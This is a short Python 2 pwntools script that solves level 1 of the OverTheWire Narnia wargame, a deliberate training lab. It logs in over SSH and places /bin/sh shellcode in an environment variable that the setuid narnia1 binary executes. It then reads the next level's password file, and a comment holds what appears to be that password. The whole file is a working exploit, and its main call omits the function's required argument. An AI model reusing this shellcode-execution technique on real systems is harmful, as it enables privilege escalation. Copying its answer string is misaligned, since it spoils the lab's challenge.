#!/usr/bin/python2
# this one is super ez. just put shellcode in an env var and it executes it for you :>
def exploit(level1password):
    from pwn import *
    import re
    ssh = ssh('narnia1', 'narnia.labs.overthewire.org', password=level1password, port=2226)
    shell = ssh.run('sh')
    shellcode = asm(pwnlib.shellcraft.linux.sh())
    hex_escaped = ''.join(["\\x%.2x" % ord(byte) for byte in shellcode])
    pwn = """EGG=$(python -c 'print "%s"') /narnia/narnia1""" %(hex_escaped)
    shell.sendline(pwn)
    shell.sendline("cat /etc/narnia_pass/narnia2\n")
    buf = ""
    print "{+} Hunting fleg/readin response pls wait might take 1 minute..."
    for x in range(0, 10):
        buf += shell.recvline(timeout=5)
#    print buf
    # efeidiedae
    regex = re.findall('[a-z]{10}', buf)
    if len(regex):
        return regex[0]
#shell.interactive()

if __name__ == "__main__":
    level2pass = exploit()
    if level2pass != None:
        print "{$$} Level 2 Password is: %s" %(level2pass)
